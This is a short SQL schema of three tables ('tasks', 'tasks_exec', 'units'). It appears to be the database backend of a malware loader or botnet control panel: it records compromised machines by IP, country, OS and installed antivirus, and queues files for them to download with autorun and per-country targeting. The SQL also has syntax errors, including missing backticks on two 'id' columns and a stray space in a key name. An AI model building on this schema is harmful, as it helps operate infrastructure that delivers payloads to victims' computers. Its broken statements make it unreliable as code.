CREATE TABLE `tasks` (
id` int (11) NOT NULL AUTO_INCREMENT,
`path` varchar (250) NOT NULL,
`run` tinyint (1) NOT NULL DEFAULT '1',
`filetype` tinyint (1) NOT NULL,
`autorun` tinyint (1) NOT NULL,
`tlimit` int (11) NOT NULL,
`units` varchar (200) NOT NULL,
`country` varchar (250) NOT NULL,
`status` tinyint (1) NOT NULL DEFAULT '1',
`loads` int (11) NOT NULL DEFAULT '0',
`exec` int (11) NOT NULL DEFAULT '0',
`error` int (11) NOT NULL DEFAULT '0',
`error2` int (11) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`)

) ENGINE = MyISAM DEFAULT CHARSET = utf8;


CREATE TABLE `tasks_exec` (
id` int (11) NOT NULL AUTO_INCREMENT,
`task_id` int (11) NOT NULL,
`unitid` varchar (16) NOT NULL,
`exec` tinyint (1) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`),
KEY `unitid` (` unitid`)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;
CREATE TABLE `units` (
`id` varchar (10) NOT NULL,
`ip` varchar (15) NOT NULL,
`online` int (10) NOT NULL,
`country` varchar (12) NOT NULL,
`version` varchar (6) NOT NULL,
`ar` varchar (10) NOT NULL,
`arch` varchar (10) NOT NULL,
`os` varchar (20) NOT NULL,
`reg` int (10) NOT NULL,
`av` varchar (15) NOT NULL,
PRIMARY KEY (`id`)

    ) ENGINE = MyISAM DEFAULT CHARSET = utf8;